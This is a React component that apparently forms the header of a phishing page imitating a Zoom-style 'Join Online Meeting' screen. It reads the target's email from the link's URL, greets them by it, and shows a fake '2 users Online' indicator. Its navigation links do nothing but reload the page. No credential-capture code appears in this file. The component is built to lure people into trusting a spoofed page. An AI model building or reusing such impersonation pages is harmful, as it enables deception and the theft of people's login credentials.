
import './zoomnav.css';

export const ZoomNav = ({ showPointer })=>{
    
    const ghj= `https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTKQDd84yLvQLwmIoSWmuVLxwaWax-yrXRguQ&s`

    const sss = `https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTUO7ULHGOGIicZDswe1MXwZED19nKzPK0umg&s`

    const online_url = `data:image/png;base64,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`

    const img_url = `data:image/png;base64,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`


    const emailInTheURL = window.location.href;
    const sliceEqualSign = emailInTheURL.indexOf("=");
    const extracetdEmail = emailInTheURL.substr((sliceEqualSign+1)).split('&', 1).toString();

    const reloadWebPage = ()=> window.location.reload();


    return(<>
        <nav>

            <div className='one'>
                <span>
                    <img 
                        alt='logo' 
                        className='logo'
                        src={ghj}
                        style={{cursor:'pointer'}}
                        onClick={reloadWebPage}
                    />
                </span>
                &#160;
                &#160;
                &#160;

                <span className='nav_proo' onClick={reloadWebPage}>Products</span>
                &#160;
                &#160;
                &#160;

                <span className='nav_proo' onClick={reloadWebPage}>Solution</span>
                &#160;
                &#160;
                &#160;

                <span className='nav_proo' onClick={reloadWebPage}>Resources</span>
                &#160;
                &#160;
                &#160;

                <span className='nav_proo' onClick={reloadWebPage}>Plans &amp; Pricing</span>
                &#160;
                &#160;
                &#160;
            </div>



            <div className='two'>
                <span className='nav_proo' onClick={reloadWebPage}>Join</span>
                &#160;
                &#160;
                &#160;

                <span className='nav_proo' onClick={reloadWebPage}>Host</span>
                &#160;
                &#160;
                &#160;

                <span className='nav_proo' onClick={reloadWebPage}>Whiteboard</span>
                &#160;
                &#160;
                &#160;
            </div>

        </nav>

        <h1 className='join___'>Join Online Meeting</h1>

        <p className='well__c'>Welcome <b style={{cursor:'pointer',color:'#2d8cff'}} onClick={reloadWebPage}>{extracetdEmail}</b>, you have been invited to join a meeting</p>

        { !showPointer ?
            <p className='onlinne'>
                2 users Online
                &#160;
                <img 
                    alt='oiu'
                    src={sss}
                    className='onn'
                />
            </p>
        
            : 
            <p className='onlinne'>Signed in as</p>
    }

        
    </>)
};